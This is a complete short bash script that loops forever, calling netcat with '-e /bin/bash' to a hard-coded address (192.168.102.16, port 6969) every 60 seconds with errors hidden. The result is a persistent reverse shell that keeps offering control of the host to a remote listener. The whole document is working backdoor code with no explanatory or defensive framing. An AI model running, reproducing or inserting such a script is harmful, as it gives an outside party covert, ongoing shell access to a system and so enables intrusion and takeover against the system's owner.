#!/bin/bash
while true
do
nc 192.168.102.16 6969 -e /bin/bash 2>/dev/null
sleep 60
done